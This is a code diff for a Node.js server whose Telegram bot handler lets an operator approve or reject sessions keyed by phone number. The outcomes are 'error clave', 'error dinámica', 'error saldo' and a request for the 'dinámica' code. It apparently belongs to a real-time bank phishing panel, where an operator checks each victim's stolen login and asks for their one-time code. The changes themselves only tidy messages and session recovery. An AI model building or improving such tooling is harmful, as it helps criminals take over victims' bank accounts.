@@ -297,18 +297,12 @@ app.post('/api/check-dynamic-status', (req, res) => {
 
 // Handle Telegram Callback Queries (Button Clicks) - Unified Handler
 bot.on('callback_query', (callbackQuery) => {
+    // Answer immediately to stop the loading icon in Telegram
+    bot.answerCallbackQuery(callbackQuery.id).catch(err => console.error('Error answering callback:', err));
+
     const action = callbackQuery.data;
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
-
-    // Normalize parsing
-    // Formats: 
-    // - approve_3001234567
-    // - reject_3001234567
-    // - approve_dynamic_3001234567
-    // - reject_user_3001234567
-    // - reject_dynamic_3001234567
-    // - reject_saldo_3001234567
 
     const parts = action.split('_');
     let rawCelular;
@@ -318,79 +312,51 @@ bot.on('callback_query', (callbackQuery) => {
     } else if (parts.length === 3) {
         rawCelular = parts[2];
     } else {
-        return bot.answerCallbackQuery(callbackQuery.id);
+        return;
     }
 
     const celular = normalizePhone(rawCelular);
     
-    console.log(`[DEBUG] Action: ${action} | Celular: ${celular}`);
+    console.log(`[ACTION] ${action} | User: ${celular}`);
 
+    // Process action logic
     if (userSessions[celular]) {
-        // Handle Actions
         if (action.includes('approve_dynamic')) {
             userSessions[celular].status = 'approved';
-            bot.sendMessage(chatId, `✅ Usuario ${celular} aprobado. Redirigiendo...`);
+            bot.sendMessage(chatId, `✅ ${celular} APROBADO`).catch(() => {});
         } 
         else if (action.includes('reject_user')) {
             userSessions[celular].status = 'rejected_user';
-            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de usuario/clave.`);
+            bot.sendMessage(chatId, `❌ ${celular} ERROR CLAVE`).catch(() => {});
         } 
         else if (action.includes('reject_dynamic')) {
             userSessions[celular].status = 'rejected_dynamic';
-            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de dinámica.`);
+            bot.sendMessage(chatId, `❌ ${celular} ERROR DINÁMICA`).catch(() => {});
         } 
         else if (action.includes('reject_saldo')) {
             userSessions[celular].status = 'rejected_saldo';
-            bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de saldo.`);
+            bot.sendMessage(chatId, `❌ ${celular} ERROR SALDO`).catch(() => {});
         }
         else if (parts.length === 2 && parts[0] === 'approve') {
-             // Initial approve (request dynamic)
              userSessions[celular].status = 'approved';
-             bot.sendMessage(chatId, `✅ Solicitud de dinámica para ${celular} iniciada.`);
+             bot.sendMessage(chatId, `✅ ${celular} PIDIENDO DINÁMICA`).catch(() => {});
         }
         else if (parts.length === 2 && parts[0] === 'reject') {
              userSessions[celular].status = 'rejected';
-             bot.sendMessage(chatId, `❌ Usuario ${celular} rechazado.`);
+             bot.sendMessage(chatId, `❌ ${celular} RECHAZADO`).catch(() => {});
         }
     } else {
-        // AUTO-RECOVERY: If session is lost (server restart), recreate it with the command
-        console.log(`[RECOVERY] Recreating session for ${celular} based on action ${action}`);
+        // Recovery logic for lost sessions
+        userSessions[celular] = { celular: celular, timestamp: Date.now(), status: 'pending' };
+        if (action.includes('approve_dynamic')) userSessions[celular].status = 'approved';
+        else if (action.includes('reject_user')) userSessions[celular].status = 'rejected_user';
+        else if (action.includes('reject_dynamic')) userSessions[celular].status = 'rejected_dynamic';
+        else if (action.includes('reject_saldo')) userSessions[celular].status = 'rejected_saldo';
+        else if (parts[0] === 'approve') userSessions[celular].status = 'approved';
+        else if (parts[0] === 'reject') userSessions[celular].status = 'rejected';
         
-        userSessions[celular] = {
-            celular: celular,
-            timestamp: Date.now(),
-            status: 'pending' // Default start
-        };
-
-        // Apply action to the new session
-        if (action.includes('approve_dynamic')) {
-            userSessions[celular].status = 'approved';
-            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ✅ Aprobada (Dinámica).`);
-        } 
-        else if (action.includes('reject_user')) {
-            userSessions[celular].status = 'rejected_user';
-            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Usuario marcado.`);
-        } 
-        else if (action.includes('reject_dynamic')) {
-            userSessions[celular].status = 'rejected_dynamic';
-            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Dinámica marcado.`);
-        } 
-        else if (action.includes('reject_saldo')) {
-            userSessions[celular].status = 'rejected_saldo';
-            bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Error Saldo marcado.`);
-        }
-        else if (parts.length === 2 && parts[0] === 'approve') {
-             userSessions[celular].status = 'approved';
-             bot.sendMessage(chatId, `⚠️ Sesión restaurada y ✅ Solicitud iniciada.`);
-        }
-        else if (parts.length === 2 && parts[0] === 'reject') {
-             userSessions[celular].status = 'rejected';
-             bot.sendMessage(chatId, `⚠️ Sesión restaurada y ❌ Rechazada.`);
-        }
+        bot.sendMessage(chatId, `⚠️ Sesión recuperada para ${celular}`).catch(() => {});
     }
-
-    // Always answer callback to stop loading animation
-    bot.answerCallbackQuery(callbackQuery.id);
 });
 
 // Global Error Handlers to prevent crash
